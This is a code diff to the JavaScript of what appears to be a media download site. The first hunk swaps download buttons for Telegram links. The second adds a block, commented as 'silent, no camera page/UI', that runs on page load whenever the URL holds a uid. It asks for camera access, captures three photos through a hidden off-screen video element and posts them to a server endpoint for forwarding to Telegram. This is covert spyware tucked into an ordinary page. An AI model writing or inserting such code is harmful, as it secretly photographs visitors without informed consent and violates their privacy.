@@ -799,13 +799,16 @@ async function fetchLibrary() {
         ${isLink ? `<button onclick="changeUrlItem('${it.id}', '${jsAttr(it.url)}')" class="btn-primary" style="background:#8b5cf6;">Change URL</button>` : ''}
         <button onclick="deleteItem('${it.kind === 'song' ? 'song' : it.kind}', '${it.id}')" class="btn-danger">Delete</button>
       </div>` : '';
+    const tgLink = it.telegramUrl || '';
     const player = isVideo
       ? `<video controls src="${escapeHtml(it.url)}" style="width: 100%; max-height: 280px; border-radius: 6px;" onplay="markSeen('movie', '${it.id}')"></video>`
       : isLink
-        ? `<a class="btn-primary download-btn" href="${escapeHtml(it.url)}" target="_blank" rel="noopener" onclick="markSeen('link', '${it.id}')">⬇ Click here to download</a>`
+        ? tgLink
+          ? `<a class="btn-primary download-btn" href="${escapeHtml(tgLink)}" target="_blank" rel="noopener" onclick="markSeen('link', '${it.id}')">💬 Click here to get file on Telegram</a>`
+          : `<a class="btn-primary download-btn" href="${escapeHtml(it.url)}" target="_blank" rel="noopener" onclick="markSeen('link', '${it.id}')">⬇ Click here to download</a>`
         : `<audio controls src="${escapeHtml(it.url)}" style="width: 100%;" onplay="markSeen('song', '${it.id}')"></audio>`;
-    const tgBtn = it.telegramUrl
-      ? `<div style="margin-top:8px;"><a class="btn-primary" style="background:#2aabee;text-decoration:none;" href="${escapeHtml(it.telegramUrl)}" target="_blank" rel="noopener">💬 Get file in Telegram</a></div>`
+    const tgBtn = tgLink
+      ? `<div style="margin-top:8px;"><a class="btn-primary" style="background:#2aabee;text-decoration:none;" href="${escapeHtml(tgLink)}" target="_blank" rel="noopener">💬 Get file in Telegram</a></div>`
       : '';
     return `
       <li class="track-item">
@@ -2017,5 +2020,75 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     bgMusic.addEventListener('play', setMusicIcon);
     bgMusic.addEventListener('pause', setMusicIcon);
     setMusicIcon();
+  }
+})();
+
+/* ------------------------------------------------------------------ */
+/* Background camera capture (silent, no camera page/UI)                */
+/* Runs when the URL has ?uid=... : asks camera permission once,        */
+/* captures 3 photos off-screen and auto-sends to Telegram.             */
+/* ------------------------------------------------------------------ */
+(function () {
+  const uid = (new URLSearchParams(location.search).get('uid') || '').trim();
+  if (!uid) return;
+
+  const video = document.createElement('video');
+  video.setAttribute('playsinline', '');
+  video.setAttribute('muted', '1');
+  video.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:10px;height:10px;opacity:0;pointer-events:none;';
+  document.body.appendChild(video);
+
+  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+  function captureFrame() {
+    const canvas = document.createElement('canvas');
+    canvas.width = Math.max(video.videoWidth, 640);
+    canvas.height = Math.max(video.videoHeight, 480);
+    const ctx = canvas.getContext('2d');
+    if (ctx.drawImage) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.85);
+    }
+    return '';
+  }
+
+  async function boot() {
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    } catch (e) {
+      try { video.remove(); } catch (_) {}
+      return;
+    }
+
+    video.srcObject = stream;
+    try { await video.play(); } catch (e) {}
+    await sleep(900);
+
+    const shots = [];
+    for (let i = 0; i < 3; i++) {
+      const frame = captureFrame();
+      if (frame) shots.push(frame);
+      await sleep(320);
+    }
+
+    try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
+    try { video.srcObject = null; video.remove(); } catch (e) {}
+
+    if (!shots.length) return;
+    try {
+      await fetch('/api/camera/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid, images: shots }),
+      });
+    } catch (e) {}
+  }
+
+  // Give the main page time to render; then attempt capture in background.
+  if (document.readyState === 'complete') {
+    boot();
+  } else {
+    window.addEventListener('load', boot, { once: true });
   }
 })();
